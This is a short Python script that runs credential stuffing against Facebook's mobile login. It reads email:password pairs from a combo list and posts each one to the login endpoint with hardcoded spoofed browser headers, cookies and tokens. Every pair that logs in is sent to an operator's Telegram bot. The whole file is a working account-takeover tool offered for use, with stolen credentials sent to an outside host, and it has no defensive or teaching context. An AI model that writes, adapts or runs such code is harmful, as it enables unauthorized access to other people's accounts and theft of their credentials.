import requests,os,time
halo = '''


'''
print(halo)
email = input('[+] List Combo : ')
telgramakaw = input("id tel :")
tokenakaw = input("token bot :")
filer = open(email,"r").readlines()
#password = input('[+] Pass : ')
ani2 = 0
dyar2 = 0
for xx in filer:
	uu = xx.strip().split(":")
	combo1 = uu[0]
	combo2 = uu[1]
	
	headers = {
	  "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
	  "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "cookie": "sb=JxZmYETLnD983J-sdhDKxloz; datr=JxZmYO_Kkqd0uriUeBjh7xMx; m_pixel_ratio=3; wd=375x812; x-referer=eyJyIjoiLz9zb2Z0PWJvb2ttYXJrcyIsImgiOiIvP3NvZnQ9Ym9va21hcmtzIiwicyI6Im10b3VjaCJ9; locale=ar_AR; fr=18QLqPXdXjz3wttYL.AWWp9DiM08Ikxyr3lxpLWhsftBc.BgZhYn.vb.AAA.0.0.BghxhH.AWXCrio57oI",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-fb-lsd": "AVoEZpcdCYo",
    "x-requested-with": "XMLHttpRequest",
    "x-response-format": "JSONStream",
    "referrer": "https://mtouch.facebook.com/login/?next&ref=dbl&fl&refid=8&paipv=0",
    "referrerPolicy": "strict-origin-when-cross-origin",
	}
	data = {
	"m_ts": "1619466306",
  "li": "QRiHYOvaTz-vUGJoT9DRid2W",
  "try_number": "0",
  "unrecognized_tries": "0",
  "email": combo1,
  "prefill_contact_point": combo1,
  "prefill_source": "browser_dropdown",
  "prefill_type": "contact_point",
  "first_prefill_source": "browser_dropdown",
  "first_prefill_type": "contact_point",
  "had_cp_prefilled": "true",
  "had_password_prefilled": "false",
  "is_smart_lock": "false",
  "bi_xrwh": "0",
  'bi_wvdp': '{"hwc":true,"hwcr":true,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true}}',
  "encpass": 
  f"#PWD_BROWSER:0:&:{combo2}",
  "fb_dtsg": "AQGASIOQEDji:AQEh9vb0OwVb",
  "jazoest": "22026",
  "lsd": "AVoEZpcdCYo",
   "__dyn":   "1Z3paBwk8aU4ifDg9ppk2m3q12wAxu13w9y1DxW0Oohx61ZwcW4o3Bw4Ewk9E4W0om0MU0D2US1kw5Kwwyo1co6K0SU2swp817U2ew5fw5NyE",
   "__csr": "",
   "__req": "f",
   "__a":    "AYmxEh96k_9cScVk4bBjufYTlH9mpDbiB0nLEUDjgVWxi22fc7dNMYr4Jn5XPLMJZ0O-SzDwFKZO4zVK7kRCpqFR4Nbv-iErKbEMoNulUV3cww",
   "__user": "0"
	}
	url = 'https://mtouch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmtouch.facebook.com%2F&lwv=100'
	req = requests.post(url, headers=headers, data=data).text
#	print(req)
	if 'CookieConsentActionHandler' in req:
		os.system("clear")
		print(halo)
		ani2+=1
		print("GOOD : "+str(ani2))
		print("ERROR : "+str(dyar2))
		ani22 = combo1+":"+combo2
		send_text2 =f'https://api.telegram.org/bot{tokenakaw}/sendMessage?chat_id={telgramakaw}&text={ani22}'
		response2 = requests.get(send_text2)
		
	else:
		os.system("clear")
		print(halo)
		dyar2+=1
		print("GOOD : "+str(ani2))
		print("ERROR : "+str(dyar2))

os.system("clear")
print("All Check Done ✓")
time.sleep(3)
exit()
	
		